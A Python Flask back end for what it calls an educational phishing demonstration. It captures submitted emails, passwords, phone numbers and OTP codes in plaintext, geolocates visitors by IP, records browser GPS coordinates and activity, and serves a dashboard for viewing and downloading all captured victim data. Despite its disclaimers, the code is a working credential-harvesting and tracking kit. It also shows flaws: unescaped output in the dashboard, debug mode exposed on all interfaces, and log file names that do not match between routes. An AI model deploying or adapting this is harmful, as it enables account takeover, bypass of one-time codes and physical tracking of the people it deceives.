"""
EDUCATIONAL PHISHING DEMONSTRATION
Network Security College Project
⚠️ FOR ACADEMIC USE ONLY - DO NOT USE MALICIOUSLY
"""

from flask import Flask, render_template, request, jsonify, send_from_directory, redirect
from datetime import datetime
import json
import os

app = Flask(__name__)

# Configuration
LOG_FILE = 'phishing_demo_log.json'

def init_log_file():
    """Initialize log file with proper JSON structure"""
    try:
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'w') as f:
                json.dump([], f)
            print(f"✅ Created new log file: {LOG_FILE}")
        else:
            # Verify file is valid JSON
            with open(LOG_FILE, 'r') as f:
                content = f.read().strip()
                if not content:
                    # File exists but is empty
                    with open(LOG_FILE, 'w') as fw:
                        json.dump([], fw)
                    print(f"✅ Initialized empty log file: {LOG_FILE}")
                else:
                    # Try to parse existing content
                    json.loads(content)
                    print(f"✅ Valid log file found: {LOG_FILE}")
    except json.JSONDecodeError as e:
        print(f"⚠️  Corrupted log file detected. Creating new one...")
        with open(LOG_FILE, 'w') as f:
            json.dump([], f)
        print(f"✅ Log file reset: {LOG_FILE}")
    except Exception as e:
        print(f"❌ Error initializing log file: {e}")

def read_logs():
    """Safely read logs from file"""
    try:
        with open(LOG_FILE, 'r') as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except json.JSONDecodeError as e:
        print(f"⚠️  JSON decode error: {e}")
        # Reset file and return empty list
        with open(LOG_FILE, 'w') as f:
            json.dump([], f)
        return []
    except Exception as e:
        print(f"❌ Error reading logs: {e}")
        return []

def write_logs(logs):
    """Safely write logs to file"""
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
        return True
    except Exception as e:
        print(f"❌ Error writing logs: {e}")
        return False

# Initialize log file on startup
init_log_file()

# ============= ROUTES =============

@app.route('/')
def index():
    """Serve the phishing demonstration website"""
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_interaction():
    """
    Log phishing attempt for educational analytics
    ⚠️ WARNING: Stores credentials in plaintext for DEMO purposes only
    """
    try:
        # Get JSON data from request
        data = request.get_json()
        
        if not data:
            print("❌ No JSON data received")
            return jsonify({'status': 'error', 'message': 'No data received'}), 400
        
        # Extract credentials
        email = data.get('email', 'N/A')
        password = data.get('password', 'N/A')
        
        # Create log entry
        log_entry = {
            'demo_id': generate_demo_id(),
            'timestamp': datetime.now().isoformat(),
            
            # ⚠️ CAPTURED CREDENTIALS (Educational Demo Only)
            'captured_email': email,
            'captured_password': password,
            'email_domain': extract_domain(email),
            'password_length': len(password),
            
            # Analytics data
            'time_to_phish_seconds': round(data.get('timeToPhish', 0), 2),
            'screen_resolution': data.get('screenResolution', 'Unknown'),
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150],
            'ip_address': request.remote_addr,
            'referer': request.headers.get('Referer', 'Direct')
        }
        
        # Read existing logs
        logs = read_logs()
        
        # Append new entry
        logs.append(log_entry)
        
        # Write back (keep last 100 entries)
        if write_logs(logs[-100:]):
            # Console output
            print("\n" + "="*60)
            print(f"🎣 PHISHING ATTEMPT CAPTURED - {log_entry['demo_id']}")
            print("="*60)
            print(f"📧 Email: {email}")
            print(f"🔑 Password: {password}")
            print(f"⏱️  Time to phish: {log_entry['time_to_phish_seconds']}s")
            print(f"🌐 IP: {log_entry['ip_address']}")
            print(f"🖥️  Screen: {log_entry['screen_resolution']}")
            print("="*60 + "\n")
            
            return jsonify({
                'status': 'success',
                'message': 'Credentials logged (Educational Demo)',
                'demo_id': log_entry['demo_id']
            }), 200
        else:
            return jsonify({'status': 'error', 'message': 'Failed to write logs'}), 500
        
    except Exception as e:
        print(f"❌ Error in log_interaction: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/stats')
def view_stats():
    """Display all captured data in a formatted view"""
    
    # Read all log files
    phishing_logs = []
    signup_logs = []
    activity_logs = []
    gps_logs = []
    
    try:
        with open('phishing_log.json', 'r') as f:
            phishing_logs = json.loads(f.read() or '[]')
    except:
        pass
    
    try:
        with open('signup_log.json', 'r') as f:
            signup_logs = json.loads(f.read() or '[]')
    except:
        pass
    
    try:
        with open('activity_log.json', 'r') as f:
            activity_logs = json.loads(f.read() or '[]')
    except:
        pass
    
    try:
        with open('gps_log.json', 'r') as f:
            gps_logs = json.loads(f.read() or '[]')
    except:
        pass
    
    # Generate HTML
    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Phishing Demo Statistics</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            
            .header {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                margin-bottom: 30px;
                text-align: center;
            }
            
            .header h1 {
                color: #333;
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            
            .header p {
                color: #666;
                font-size: 1.1em;
            }
            
            .stats-summary {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            
            .stat-card {
                background: white;
                padding: 25px;
                border-radius: 12px;
                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
                text-align: center;
                transition: transform 0.3s ease;
            }
            
            .stat-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 8px 30px rgba(0,0,0,0.15);
            }
            
            .stat-card h3 {
                color: #667eea;
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            
            .stat-card p {
                color: #666;
                font-size: 1.1em;
                font-weight: 500;
            }
            
            .section {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                margin-bottom: 30px;
            }
            
            .section-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
                padding-bottom: 15px;
                border-bottom: 3px solid #667eea;
            }
            
            .section-header h2 {
                color: #333;
                font-size: 1.8em;
            }
            
            .toggle-btn {
                background: #667eea;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 8px;
                cursor: pointer;
                font-size: 14px;
                font-weight: 500;
                transition: all 0.3s;
            }
            
            .toggle-btn:hover {
                background: #5568d3;
                transform: scale(1.05);
            }
            
            .json-container {
                background: #1e1e1e;
                padding: 20px;
                border-radius: 10px;
                overflow-x: auto;
                max-height: 600px;
                overflow-y: auto;
            }
            
            .json-content {
                color: #d4d4d4;
                font-family: 'Courier New', monospace;
                font-size: 13px;
                line-height: 1.6;
                white-space: pre-wrap;
            }
            
            .entry-card {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 15px;
                border-left: 4px solid #667eea;
            }
            
            .entry-card h4 {
                color: #667eea;
                margin-bottom: 12px;
                font-size: 1.1em;
            }
            
            .entry-field {
                display: grid;
                grid-template-columns: 200px 1fr;
                gap: 10px;
                margin-bottom: 8px;
                font-size: 14px;
            }
            
            .entry-field strong {
                color: #555;
            }
            
            .entry-field span {
                color: #333;
                word-break: break-all;
            }
            
            .no-data {
                text-align: center;
                padding: 40px;
                color: #999;
                font-style: italic;
            }
            
            .badge {
                display: inline-block;
                padding: 4px 12px;
                border-radius: 12px;
                font-size: 12px;
                font-weight: 600;
                margin-left: 10px;
            }
            
            .badge-success {
                background: #d4edda;
                color: #155724;
            }
            
            .badge-danger {
                background: #f8d7da;
                color: #721c24;
            }
            
            .badge-info {
                background: #d1ecf1;
                color: #0c5460;
            }
            
            .action-buttons {
                display: flex;
                gap: 15px;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            
            .btn {
                padding: 12px 24px;
                border: none;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.3s;
                text-decoration: none;
                display: inline-block;
            }
            
            .btn-primary {
                background: #667eea;
                color: white;
            }
            
            .btn-primary:hover {
                background: #5568d3;
                transform: translateY(-2px);
            }
            
            .btn-danger {
                background: #dc3545;
                color: white;
            }
            
            .btn-danger:hover {
                background: #c82333;
                transform: translateY(-2px);
            }
            
            .btn-success {
                background: #28a745;
                color: white;
            }
            
            .btn-success:hover {
                background: #218838;
                transform: translateY(-2px);
            }
            
            .collapsed {
                display: none;
            }
            
            .map-link {
                color: #667eea;
                text-decoration: none;
                font-weight: 500;
            }
            
            .map-link:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 Phishing Demo Statistics</h1>
                <p>Educational Network Security Demonstration - All Captured Data</p>
            </div>
            
            <div class="stats-summary">
                <div class="stat-card">
                    <h3>''' + str(len(phishing_logs)) + '''</h3>
                    <p>Complete Submissions</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(len(signup_logs)) + '''</h3>
                    <p>Signup Attempts</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(len(gps_logs)) + '''</h3>
                    <p>GPS Locations Captured</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(len(activity_logs)) + '''</h3>
                    <p>Activity Events Logged</p>
                </div>
            </div>
            
            <div class="action-buttons">
                <a href="/" class="btn btn-primary">← Back to Demo</a>
                <button onclick="downloadAllData()" class="btn btn-success">📥 Download All Data</button>
                <button onclick="if(confirm('Clear all logs?')) window.location.href='/clear-logs'" class="btn btn-danger">🗑️ Clear All Logs</button>
            </div>
    '''
    
    # Complete Phishing Submissions
    html += '''
            <div class="section">
                <div class="section-header">
                    <h2>📋 Complete Phishing Submissions (''' + str(len(phishing_logs)) + ''')</h2>
                    <button class="toggle-btn" onclick="toggleSection('phishing')">Toggle View</button>
                </div>
                <div id="phishing-content">
    '''
    
    if phishing_logs:
        for log in reversed(phishing_logs):
            otp_badge = '<span class="badge badge-success">✓ Correct OTP</span>' if log.get('otp_correct') else '<span class="badge badge-danger">✗ Wrong OTP</span>'
            html += f'''
                    <div class="entry-card">
                        <h4>Session: {log.get('session_id', 'N/A')} {otp_badge}</h4>
                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Mobile:</strong> <span>{log.get('mobile', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Email:</strong> <span>{log.get('email', 'N/A')}</span></div>
                        <div class="entry-field"><strong>OTP Entered:</strong> <span>{log.get('otp_entered', 'N/A')}</span></div>
                        <div class="entry-field"><strong>IP Address:</strong> <span>{log.get('ip', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Location:</strong> <span>{log.get('city', 'N/A')}, {log.get('region', 'N/A')}, {log.get('country', 'N/A')}</span></div>
                        <div class="entry-field"><strong>ISP:</strong> <span>{log.get('isp', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Time to Complete:</strong> <span>{log.get('time_to_complete', 0):.1f} seconds</span></div>
                        <div class="entry-field"><strong>User Agent:</strong> <span>{log.get('user_agent', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Activities:</strong> <span>{len(log.get('activities', []))} events tracked</span></div>
                    </div>
            '''
    else:
        html += '<div class="no-data">No complete submissions yet</div>'
    
    html += '''
                </div>
            </div>
    '''
    
    # GPS Locations
    html += '''
            <div class="section">
                <div class="section-header">
                    <h2>📍 GPS Locations Captured (''' + str(len(gps_logs)) + ''')</h2>
                    <button class="toggle-btn" onclick="toggleSection('gps')">Toggle View</button>
                </div>
                <div id="gps-content">
    '''
    
    if gps_logs:
        for log in reversed(gps_logs):
            status_badge = '<span class="badge badge-success">✓ Granted</span>' if log.get('permissionStatus') == 'granted' else '<span class="badge badge-danger">✗ Denied</span>'
            map_link = ''
            if log.get('latitude') and log.get('longitude'):
                map_link = f'<a href="https://www.google.com/maps?q={log.get("latitude")},{log.get("longitude")}" target="_blank" class="map-link">🗺️ View on Map</a>'
            
            html += f'''
                    <div class="entry-card">
                        <h4>Session: {log.get('session_id', 'N/A')} {status_badge}</h4>
                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Latitude:</strong> <span>{log.get('latitude', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Longitude:</strong> <span>{log.get('longitude', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Accuracy:</strong> <span>{log.get('accuracy', 'N/A')} meters</span></div>
                        <div class="entry-field"><strong>Permission Status:</strong> <span>{log.get('permissionStatus', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Map:</strong> <span>{map_link}</span></div>
                    </div>
            '''
    else:
        html += '<div class="no-data">No GPS locations captured yet</div>'
    
    html += '''
                </div>
            </div>
    '''
    
    # Signup Logs
    html += '''
            <div class="section">
                <div class="section-header">
                    <h2>✍️ Signup Attempts (''' + str(len(signup_logs)) + ''')</h2>
                    <button class="toggle-btn" onclick="toggleSection('signup')">Toggle View</button>
                </div>
                <div id="signup-content">
    '''
    
    if signup_logs:
        for log in reversed(signup_logs):
            html += f'''
                    <div class="entry-card">
                        <h4>Signup ID: {log.get('signup_id', 'N/A')}</h4>
                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Mobile:</strong> <span>{log.get('mobile', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Email:</strong> <span>{log.get('email', 'N/A')}</span></div>
                        <div class="entry-field"><strong>IP Address:</strong> <span>{log.get('ip', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Location:</strong> <span>{log.get('city', 'N/A')}, {log.get('country', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Session ID:</strong> <span>{log.get('session_id', 'N/A')}</span></div>
                    </div>
            '''
    else:
        html += '<div class="no-data">No signup attempts yet</div>'
    
    html += '''
                </div>
            </div>
    '''
    
    # Activity Logs
    html += '''
            <div class="section">
                <div class="section-header">
                    <h2>🎬 Activity Events (''' + str(len(activity_logs)) + ''')</h2>
                    <button class="toggle-btn" onclick="toggleSection('activity')">Toggle View</button>
                </div>
                <div id="activity-content" class="collapsed">
    '''

    if activity_logs:
        for log in reversed(activity_logs):  # Show ALL activities
            html += f'''
                    <div class="entry-card">
                        <h4>Action: {log.get('action', 'N/A')}</h4>
                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Session ID:</strong> <span>{log.get('sessionId', 'N/A')}</span></div>
                        <div class="entry-field"><strong>Time from Load:</strong> <span>{log.get('timeFromLoad', 0):.2f} seconds</span></div>
                        <div class="entry-field"><strong>Details:</strong> <span>{str(log.get('details', {}))}</span></div>
                    </div>
            '''
    else:
        html += '<div class="no-data">No activities logged yet</div>'

    html += '''
                </div>
            </div>
    '''

    
    # Raw JSON Sections
    html += '''
            <div class="section">
                <div class="section-header">
                    <h2>📄 Raw JSON Data</h2>
                </div>
                
                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Activity Events JSON (All Events)</h3>
                <div class="json-container">
                    <pre class="json-content">''' + json.dumps(activity_logs, indent=2) + '''</pre>
                </div>

                
                <h3 style="margin: 20px 0 10px 0; color: #667eea;">GPS Locations JSON</h3>
                <div class="json-container">
                    <pre class="json-content">''' + json.dumps(gps_logs, indent=2) + '''</pre>
                </div>
                
                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Signup Attempts JSON</h3>
                <div class="json-container">
                    <pre class="json-content">''' + json.dumps(signup_logs, indent=2) + '''</pre>
                </div>
                
                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Activity Events JSON (Last 100)</h3>
                <div class="json-container">
                    <pre class="json-content">''' + json.dumps(activity_logs, indent=2) + '''</pre>
                </div>
            </div>
        </div>
        
        <script>
            function toggleSection(section) {
                const content = document.getElementById(section + '-content');
                content.classList.toggle('collapsed');
            }
            
            function downloadAllData() {
                const allData = {
                    phishing_submissions: ''' + json.dumps(phishing_logs) + ''',
                    gps_locations: ''' + json.dumps(gps_logs) + ''',
                    signup_attempts: ''' + json.dumps(signup_logs) + ''',
                    activity_events: ''' + json.dumps(activity_logs) + ''',
                    exported_at: new Date().toISOString()
                };
                
                const dataStr = JSON.stringify(allData, null, 2);
                const dataBlob = new Blob([dataStr], {type: 'application/json'});
                const url = URL.createObjectURL(dataBlob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'phishing_demo_data_' + new Date().toISOString().split('T')[0] + '.json';
                link.click();
                URL.revokeObjectURL(url);
            }
        </script>
    </body>
    </html>
    '''
    
    return html


@app.route('/clear-logs')
def clear_logs():
    """Clear all log files"""
    try:
        with open('phishing_log.json', 'w') as f:
            json.dump([], f)
        with open('signup_log.json', 'w') as f:
            json.dump([], f)
        with open('activity_log.json', 'w') as f:
            json.dump([], f)
        with open('gps_log.json', 'w') as f:
            json.dump([], f)
        
        return redirect('/stats')
    except Exception as e:
        return f"Error clearing logs: {e}", 500


def render_no_stats():
    """Render page when no statistics available"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Demo Statistics</title>
        <style>
            body { font-family: Arial; padding: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            h1 { color: #c9184a; margin-bottom: 20px; }
            p { font-size: 1.1em; color: #666; margin: 15px 0; }
            a { display: inline-block; margin-top: 25px; background: #c9184a; color: white; padding: 14px 30px; text-decoration: none; border-radius: 6px; }
            a:hover { background: #a01639; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Phishing Demo Statistics</h1>
            <p><strong>Total Attempts:</strong> 0</p>
            <p>No phishing attempts logged yet. Run the demo first!</p>
            <a href="/">← Back to Demo</a>
        </div>
    </body>
    </html>
    """

@app.route('/reset', methods=['POST', 'GET'])
def reset_logs():
    """Reset demo logs"""
    try:
        write_logs([])
        print("🗑️  Logs reset successfully")
        return jsonify({'status': 'success', 'message': 'Logs reset successfully'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ============= HELPER FUNCTIONS =============

def extract_domain(email):
    """Extract domain from email"""
    try:
        if '@' in email:
            return email.split('@')[1]
        return 'Unknown'
    except:
        return 'Unknown'

def generate_demo_id():
    """Generate unique demo ID"""
    return f"DEMO_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:20]}"




import requests

# Add this function to get real IP and location
def get_client_ip_and_location():
    """Get client's real IP address and approximate location"""
    # Try to get real IP from headers (for proxies/port forwarding)
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    # Get location from IP
    location_data = {}
    try:
        # Using ipapi.co free service (no API key needed)
        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
        if response.status_code == 200:
            data = response.json()
            location_data = {
                'ip': ip,
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'latitude': data.get('latitude'),
                'longitude': data.get('longitude'),
                'isp': data.get('org', 'Unknown')
            }
    except Exception as e:
        print(f"Error getting location: {e}")
        location_data = {'ip': ip, 'city': 'Unknown', 'country': 'Unknown'}
    
    return location_data

# Update all your logging routes to use this
@app.route('/log-activity', methods=['POST'])
def log_activity():
    try:
        data = request.get_json()
        location_data = get_client_ip_and_location()
        
        activity_entry = {
            'activity_id': f"ACT_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:20]}",
            'timestamp': datetime.now().isoformat(),
            'action': data.get('action', 'unknown'),
            'session_id': data.get('sessionId', 'N/A'),
            'time_from_load': data.get('timeFromLoad', 0),
            'details': data.get('details', {}),
            
            # Real IP and location
            **location_data,
            
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150],
            'referrer': data.get('referrer', 'Direct'),
            'screen_resolution': data.get('screenResolution', 'Unknown'),
            'language': data.get('language', 'Unknown'),
        }
        
        # Save to file
        activity_log_file = 'activity_log.json'
        try:
            with open(activity_log_file, 'r') as f:
                activities = json.loads(f.read() or '[]')
        except:
            activities = []
        
        activities.append(activity_entry)
        
        with open(activity_log_file, 'w') as f:
            json.dump(activities[-500:], f, indent=2)
        
        print(f"[ACTIVITY] {activity_entry['action']} - IP: {location_data['ip']} - Location: {location_data.get('city')}, {location_data.get('country')}")
        
        return jsonify({'status': 'success', 'activity_id': activity_entry['activity_id']}), 200
        
    except Exception as e:
        print(f"Error logging activity: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/log-signup', methods=['POST'])
def log_signup():
    try:
        data = request.get_json()
        location_data = get_client_ip_and_location()
        
        signup_entry = {
            'signup_id': f"SIGNUP_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:22]}",
            'timestamp': datetime.now().isoformat(),
            'mobile': data.get('mobile', 'N/A'),
            'email': data.get('email', 'N/A'),
            'password': data.get('password', 'N/A'),
            'session_id': data.get('sessionId', 'N/A'),
            
            # Real IP and location
            **location_data,
            
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150]
        }
        
        signup_log_file = 'signup_log.json'
        try:
            with open(signup_log_file, 'r') as f:
                signups = json.loads(f.read() or '[]')
        except:
            signups = []
        
        signups.append(signup_entry)
        
        with open(signup_log_file, 'w') as f:
            json.dump(signups[-100:], f, indent=2)
        
        print(f"\n[SIGNUP] Mobile: {signup_entry['mobile']} | Email: {signup_entry['email']}")
        print(f"         IP: {location_data['ip']} | Location: {location_data.get('city')}, {location_data.get('country')}")
        
        return jsonify({'status': 'success', 'signup_id': signup_entry['signup_id']}), 200
        
    except Exception as e:
        print(f"Error logging signup: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# New route for GPS location capture
@app.route('/log-gps-location', methods=['POST'])
def log_gps_location():
    try:
        data = request.get_json()
        location_data = get_client_ip_and_location()
        
        gps_entry = {
            'gps_id': f"GPS_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:20]}",
            'timestamp': datetime.now().isoformat(),
            'session_id': data.get('sessionId', 'N/A'),
            
            # GPS coordinates
            'gps_latitude': data.get('latitude'),
            'gps_longitude': data.get('longitude'),
            'gps_accuracy': data.get('accuracy'),
            'permission_status': data.get('permissionStatus', 'unknown'),
            
            # IP-based location for comparison
            **location_data,
            
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150]
        }
        
        gps_log_file = 'gps_location_log.json'
        try:
            with open(gps_log_file, 'r') as f:
                gps_logs = json.loads(f.read() or '[]')
        except:
            gps_logs = []
        
        gps_logs.append(gps_entry)
        
        with open(gps_log_file, 'w') as f:
            json.dump(gps_logs[-100:], f, indent=2)
        
        print(f"\n[GPS] Session: {gps_entry['session_id']}")
        print(f"      GPS: {data.get('latitude')}, {data.get('longitude')} (±{data.get('accuracy')}m)")
        print(f"      IP Location: {location_data.get('city')}, {location_data.get('country')}")
        
        return jsonify({'status': 'success', 'gps_id': gps_entry['gps_id']}), 200
        
    except Exception as e:
        print(f"Error logging GPS: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Venue map page
@app.route('/venue-map')
def venue_map():
    return render_template('venue_map.html')



# ============= MAIN =============

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🎭 EDUCATIONAL PHISHING DEMONSTRATION SERVER")
    print("   Network Security Project - For Academic Use Only")
    print("="*70)
    print("\n⚠️  CRITICAL ETHICAL GUIDELINES:")
    print("   1. ✅ Use ONLY in controlled lab environments")
    print("   2. ✅ Obtain written institutional approval")
    print("   3. ✅ Never deploy against real users without consent")
    print("   4. ⚠️  Credentials stored in PLAINTEXT for demo analysis")
    print("   5. ⚠️  Delete logs after project completion")
    print("   6. 🚫 UNAUTHORIZED USE IS ILLEGAL")
    print("="*70)
    print("\n📍 Access Points:")
    print("   • Demo Website:  http://localhost:5000/")
    print("   • Statistics:    http://localhost:5000/stats")
    print("   • Reset Logs:    http://localhost:5000/reset")
    print("\n🚀 Starting server...\n")
    print("="*70 + "\n")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
